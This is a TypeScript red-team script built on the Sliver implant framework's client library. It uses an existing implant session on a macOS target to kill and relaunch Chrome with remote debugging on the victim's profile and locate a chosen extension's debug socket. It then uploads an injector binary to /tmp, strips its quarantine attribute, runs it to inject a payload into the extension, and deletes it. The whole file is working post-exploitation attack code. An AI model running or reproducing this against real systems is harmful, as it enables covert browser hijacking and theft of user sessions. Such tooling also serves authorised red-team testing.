#!/usr/bin/env npx ts-node

/*
	Sliver Implant Framework
	Copyright (C) 2020  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import * as fs from 'fs'
import * as readline from 'readline'

import { ArgumentParser } from 'argparse';
import { SliverClient, ParseConfigFile, InteractiveSession } from 'sliver-script'
import { Session } from 'sliver-script/lib/pb/clientpb/client_pb'
import { Execute } from 'sliver-script/lib/pb/sliverpb/sliver_pb'


const DEBUG_PORT = 21099
const EXTENSION_ID = 'cjpalhdlnbpafiamejdnhcphjbkeiagm'
const CHROME_MACOS_HIJACK_PATH = "chrome-hijack"
const CHROME_MACOS_PATH = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"

// CLI Parser
const parser = new ArgumentParser({
  description: 'Inject Chrome Extensions into Chrome Extensions so you can extend the extensions',
  add_help: true,
})
parser.add_argument('--config', { required: true, help: 'path to config' })
parser.add_argument('--session', { required: true, type: Number, help: 'target session id' })
const args = parser.parse_args()

// ----------------------------------------------------------------------

async function getSessionById(client: SliverClient, id: number) {
  const sessions = await client.sessions()
  for (let index = 0; index < sessions.length; ++index) {
    if (sessions[index].getId() === id) {
      return sessions[index]
    }
  }
  return null
}

async function getChromeProcess(interact: InteractiveSession) {
  const ps = await interact.ps()
  for (let index = 0; index < ps.length; ++index) {
    const process = ps[index]
    if (process.getExecutable() === 'Google Chrome') {
      return process
    }
  }
  return null
}

async function findUserDataDir(session: Session, interact: InteractiveSession): Promise<string|null> {
  let userDataPath = ''
  switch(session.getOs()) {
    case 'darwin':
      userDataPath = `/Users/${session.getUsername()}/Library/Application Support/Google/Chrome`
      break
  }
  if (userDataPath === '') {
    return null
  }

  const ls = await interact.ls(userDataPath)
  if (ls.getExists()) {
    return userDataPath
  }
  return null
}

async function prompt(msg: string): Promise<string> {
  return new Promise(resolve => {
    process.stdout.write(msg)
    const reader = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
      terminal: false
    });
    
    reader.on('line', (line: string) => {
      resolve(line)
    })
  })
}

function findDebugSocketFor(extensionId: string, curl: Execute): string|null {
  try {
    const debuggers = JSON.parse(curl.getResult())
    for (let index = 0; index < debuggers.length; ++index) {
      const context = debuggers[index]
      const url = new URL(context.url)
      if (url.hostname === extensionId) {
        return context.webSocketDebuggerUrl
      }
    }
    return null
  } catch(err) {
    console.error(`Failed to parse JSON response: ${err}`)
    return null
  }
}

function randomFileName(size: number = 6, prefix: string = ''): string {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  for (let index = 0; index < size; ++index) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return `${prefix}${result}`
}

async function confirm(msg: string): Promise<boolean> {
  const line = await prompt(msg)
  return line.toLowerCase().startsWith('y')
}

async function sleep(ms: number) {
  return new Promise(resolve => {
    setTimeout(resolve, ms)
  })
}

if (fs.existsSync(args.config)) {
  (async () => {

    const config = await ParseConfigFile(args.config)
    const client = new SliverClient(config)

    console.log(`Connecting to ${config.lhost} ...`)
    await client.connect()

    const session = await getSessionById(client, args.session)
    if (session === null) {
      console.log(`Session ${args.session} not found`)
      process.exit(0)
    }

    const interact = await client.interactWith(session)
    
    // Find UserDataDir
    const userDataDir = await findUserDataDir(session, interact)
    if (userDataDir === null) {
      console.log('[!] Failed to find user data directory')
      process.exit(2)
    }

    // Check if Chrome is running
    const chrome = await getChromeProcess(interact)
    if (chrome) {
      console.log('[*] Chrome is currently running!')
      const confirmTerminate = await confirm('[?] Terminate the current Chrome process? [y/n] ')
      if (!confirmTerminate) {
        process.exit(0)
      }
      console.log('[*] Stopping current process ...')
      await interact.terminate(chrome.getPid())
    }
    
    // Start Chrome with remote debugging enabled
    console.log('[*] Starting Chrome with remote debugging enabled ...')
    await interact.execute(CHROME_MACOS_PATH, [
      `--remote-debugging-port=${DEBUG_PORT}`,
      `--user-data-dir=${userDataDir}`,
      '--restore-last-session'
    ], false)

    await sleep(750) // Wait for Chrome to init

    // Find the websocket for the extension context we want to inject into
    const curl = await interact.execute('curl', ['-s', `http://localhost:${DEBUG_PORT}/json`], true)
    if (curl.getStatus() !== 0) {
      console.error(`[!] Failed to curl debug port (exit ${curl.getStatus()})`)
      process.exit(3)
    }
    const wsUrl = findDebugSocketFor(EXTENSION_ID, curl)
    if (wsUrl === null) {
      console.error(`[!] Could not find debug socket for: ${EXTENSION_ID}`)
      process.exit(4)
    }
    console.log(`[*] Found target debug socket ${wsUrl}`)

    // Upload payload - TODO: Load dylib in-memory
    // TODO: MacOS only
    console.log(`[*] Uploading payload injector ...`)
    if (!fs.existsSync(CHROME_MACOS_HIJACK_PATH)) {
      console.error(`[!] Failed to load payload from: ${CHROME_MACOS_HIJACK_PATH}`)
      process.exit(5)
    }
    const data = fs.readFileSync(CHROME_MACOS_HIJACK_PATH)
    const upload = await interact.upload(`/tmp/${randomFileName()}`, data)
    console.log('[*] Removing quarantine bit ...')
    await interact.execute('chmod', ['+x', upload.getPath()], true)
    await interact.execute('xattr', ['-r', '-d', 'com.apple.quarantine', upload.getPath()], true)

    console.log(`[*] Executing payload injector ...`)
    const injection = await interact.execute(upload.getPath(), ['-remote', wsUrl], true)

    console.log('[*] Cleaning up ...')
    await interact.rm(upload.getPath())

    console.log('[*] Successfully injected payload into target extension, good hunting!')
    process.exit(0)

  })();
} else {
  if (args.config) {
    console.log(`Config '${args.config}' does not exist`)
  } else {
    console.log('Missing --config argument, see --help')
  }
}
